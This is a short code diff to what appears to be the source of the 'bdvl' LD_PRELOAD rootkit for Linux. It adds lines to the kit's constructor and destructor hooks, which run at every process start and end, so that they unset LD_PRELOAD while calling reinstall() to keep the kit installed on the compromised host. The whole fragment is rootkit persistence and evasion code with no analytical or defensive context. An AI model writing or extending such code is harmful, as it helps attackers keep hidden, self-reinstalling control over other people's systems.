@@ -1,10 +1,12 @@
 // this file just gets appended onto the end of bdvl.c
 void __attribute ((constructor)) phook_init (void) // on process start
 {
-    reinstall(); // attempt to check kit status on the box and reinstall if needed
+    if(getenv("LD_PRELOAD") != NULL) unsetenv("LD_PRELOAD");
+    reinstall();
 }
 
 void __attribute ((destructor)) phook_dest (void) // on process end
 {
+    if(getenv("LD_PRELOAD") != NULL) unsetenv("LD_PRELOAD");
     reinstall();
 }
